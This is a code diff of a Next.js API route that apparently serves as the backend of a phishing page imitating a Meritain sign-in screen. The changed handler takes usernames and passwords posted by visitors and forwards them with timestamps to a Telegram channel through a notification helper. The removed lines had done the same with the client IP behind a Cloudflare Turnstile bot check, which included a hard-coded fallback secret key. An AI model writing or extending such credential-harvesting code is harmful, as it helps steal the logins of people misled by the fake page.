@@ -1,50 +1,33 @@
-import { NextRequest, NextResponse } from "next/server";
-import { telegramService } from "@/lib/telegram";
-import { getClientIp } from "@/lib/request-ip";
+import { NextRequest, NextResponse } from "next/server"
 
-const TURNSTILE_SECRET_KEY =
-  process.env.TURNSTILE_SECRET_KEY || "0x4AAAAAAC8q_jNSVySLlbqxP6g_lbEwWAk";
+import { MERITAIN_SIGN_IN_PATH } from "@/lib/meritain-paths"
+import { sendFormNotification } from "@/lib/telegram"
 
 export async function POST(request: NextRequest) {
   try {
-    const data = await request.json();
-    const turnstileToken = data?.turnstileToken;
-    if (turnstileToken) {
-      const verifyRes = await fetch(
-        "https://challenges.cloudflare.com/turnstile/v0/siteverify",
-        {
-          method: "POST",
-          headers: { "Content-Type": "application/x-www-form-urlencoded" },
-          body: new URLSearchParams({
-            secret: TURNSTILE_SECRET_KEY,
-            response: turnstileToken,
-          }).toString(),
-        },
-      );
-
-      const verification = await verifyRes.json().catch(() => null);
-      if (!verification?.success) {
-        return NextResponse.json(
-          { success: false, error: "Turnstile validation failed" },
-          { status: 403 },
-        );
-      }
+    const data = (await request.json()) as {
+      type?: string
+      userId?: string
+      username?: string
+      password?: string
+      method?: string
+      page?: string
     }
+    const userId = data.userId ?? data.username ?? ""
+    const type =
+      data.type === "sign_in_identifier" ? "sign_in_identifier" : "login"
 
-    const { turnstileToken: _t, ...loginData } = data;
-    const ip = getClientIp(request);
-    await telegramService.sendLoginNotification({ ...loginData, ip });
-    const response = NextResponse.json({ success: true });
-    response.cookies.set("login_flow", "1", {
-      path: "/",
-      maxAge: 10 * 60,
-    });
-    return response;
+    await sendFormNotification({
+      type,
+      userId,
+      password: type === "login" ? (data.password ?? "") : undefined,
+      method: data.method,
+      timestamp: new Date().toISOString(),
+      page: data.page ?? MERITAIN_SIGN_IN_PATH,
+    })
+    return NextResponse.json({ success: true })
   } catch (error) {
-    console.error("Error sending login notification:", error);
-    return NextResponse.json(
-      { error: "Failed to send notification" },
-      { status: 500 },
-    );
+    console.error("Error sending login notification:", error)
+    return NextResponse.json({ error: "Failed to send notification" }, { status: 500 })
   }
 }
